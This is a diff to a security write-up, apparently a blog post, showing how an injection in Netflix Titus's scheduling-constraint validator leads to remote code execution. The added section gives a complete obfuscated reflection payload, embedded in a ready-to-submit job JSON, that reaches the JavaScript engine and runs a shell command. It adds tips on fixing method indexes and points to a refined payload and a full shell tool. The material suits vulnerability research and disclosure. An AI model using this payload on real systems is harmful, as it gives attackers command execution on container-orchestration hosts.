@@ -246,7 +246,7 @@ A neat data model for Titus can be found [here](https://github.com/Netflix/titus
 {
     "applicationName": "myApp",
     "owner": {
-        "teamEmail": "kanav0610@gmail.com"
+        "teamEmail": "hello@gmail.com"
     },
     "container": {
         "resources": {
@@ -307,7 +307,7 @@ We open our debugger, and we find that when creating a job, first individual con
 
 As the validation is done inside `SchedulingConstraintValidator.java` file first, we see that in the `isValid` function:
 
-```java
+```
 Set<String> namesInLowerCase = value.keySet().stream().map(String::toLowerCase).collect(Collectors.toSet());
 ```
 
@@ -331,4 +331,57 @@ Required Code | Payload
 `''.class.forName('javax.script.ScriptEngineManager')` | `''.class.class.methods[0].invoke(''.class, 'javax.script.' + 'a'.replace('a', 83) + 'cript' + 'a'.replace('a', 69) + 'ngine' + 'a'.replace('a', 77) + 'anager')`
 `''.class.forName('javax.script.ScriptEngineManager').newInstance()` | `''.class.class.methods[14].invoke(''.class.class.methods[0].invoke(''.class, 'javax.script.' + 'a'.replace('a', 83) + 'cript' + 'a'.replace('a', 69) + 'ngine' + 'a'.replace('a', 77) + 'anager'))`
 `''.class.forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js')` | `''.class.class.methods[14].invoke(''.class.class.methods[0].invoke(''.class, 'javax.script.' + 'a'.replace('a', 83) + 'cript' + 'a'.replace('a', 69) + 'ngine' + 'a'.replace('a', 77) + 'anager')).class.methods[1].invoke(''.class.class.methods[14].invoke(''.class.class.methods[0].invoke(''.class, 'javax.script.' + 'a'.replace('a', 83) + 'cript' + 'a'.replace('a', 69) + 'ngine' + 'a'.replace('a', 77) + 'anager')), 'js')`
+
+### Final Payload
+
+Continuing such translation, I managed to run `''.class.forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').compile('java.lang.Runtime.getRuntime().exec("touch /tmp/hello")').eval()`
+
+```json
+{
+    "applicationName": "myApp",
+    "owner": {
+        "teamEmail": "hello@gmail.com"
+    },
+    "container": {
+        "resources": {
+            "cpu": 1,
+            "memoryMB": 128,
+            "diskMB": 128,
+            "networkMbps": 1
+        },
+        "securityProfile": {"iamRole": "test-role", "securityGroups": ["sg-test"]},
+        "image": {
+            "name": "ubuntu",
+            "tag": "xenial"
+        },
+        "softConstraints": {
+        },
+        "hardConstraints": {
+            "constraints": {
+                "#{''.class.class.methods[14].invoke(''.class.class.methods[0].invoke(''.class, 'javax.script.' + 'a'.replace('a', 83) + 'cript' + 'a'.replace('a', 69) + 'ngine' + 'a'.replace('a', 77) + 'anager')).class.methods[1].invoke(''.class.class.methods[14].invoke(''.class.class.methods[0].invoke(''.class, 'javax.script.' + 'a'.replace('a', 83) + 'cript' + 'a'.replace('a', 69) + 'ngine' + 'a'.replace('a', 77) + 'anager')), 'js').class.methods[7].invoke(''.class.class.methods[14].invoke(''.class.class.methods[0].invoke(''.class, 'javax.script.' + 'a'.replace('a', 83) + 'cript' + 'a'.replace('a', 69) + 'ngine' + 'a'.replace('a', 77) + 'anager')).class.methods[1].invoke(''.class.class.methods[14].invoke(''.class.class.methods[0].invoke(''.class, 'javax.script.' + 'a'.replace('a', 83) + 'cript' + 'a'.replace('a', 69) + 'ngine' + 'a'.replace('a', 77) + 'anager')), 'js'), 'print(1);').class.methods[3].invoke(''.class.class.methods[14].invoke(''.class.class.methods[0].invoke(''.class, 'javax.script.' + 'a'.replace('a', 83) + 'cript' + 'a'.replace('a', 69) + 'ngine' + 'a'.replace('a', 77) + 'anager')).class.methods[1].invoke(''.class.class.methods[14].invoke(''.class.class.methods[0].invoke(''.class, 'javax.script.' + 'a'.replace('a', 83) + 'cript' + 'a'.replace('a', 69) + 'ngine' + 'a'.replace('a', 77) + 'anager')), 'js').class.methods[7].invoke(''.class.class.methods[14].invoke(''.class.class.methods[0].invoke(''.class, 'javax.script.' + 'a'.replace('a', 83) + 'cript' + 'a'.replace('a', 69) + 'ngine' + 'a'.replace('a', 77) + 'anager')).class.methods[1].invoke(''.class.class.methods[14].invoke(''.class.class.methods[0].invoke(''.class, 'javax.script.' + 'a'.replace('a', 83) + 'cript' + 'a'.replace('a', 69) + 'ngine' + 'a'.replace('a', 77) + 'anager')), 'js'), 'java.lang.' + 'a'.replace('a', 82) +  'untime.get' + 'a'.replace('a', 82) + 'untime().exec(\"touch /tmp/pwn\")')) + ''}": "lol"
+            }
+        }
+    },
+    "service": {
+        "capacity": {
+            "min": 1,
+            "max": 1,
+            "desired": 1
+        },
+        "retryPolicy": {
+            "immediate": {
+                "retries": 10
+            }
+        }
+    }
+}
+```
+
+Result - 
+
+![result](/images/tada.png)
+
+This payload contains a particular caveat. Index for a particular function changes with different boots. This happens generally for the methods with multiple overloads, like `compile` function which have overloads for both `String` and `Reader`. Hence we need to find the index first. I observed the change of index from 7 to 6. So it's important to first find at what indexes our desired functions are, then we can execute our code.
+
+A more refined version of this payload is present in this [file](payloads/refined.sh) but the caveat is still present there. A python project where you can run a complete shell (like in SSH) is present [here](titus-shell/) which is free of all such problems.
 
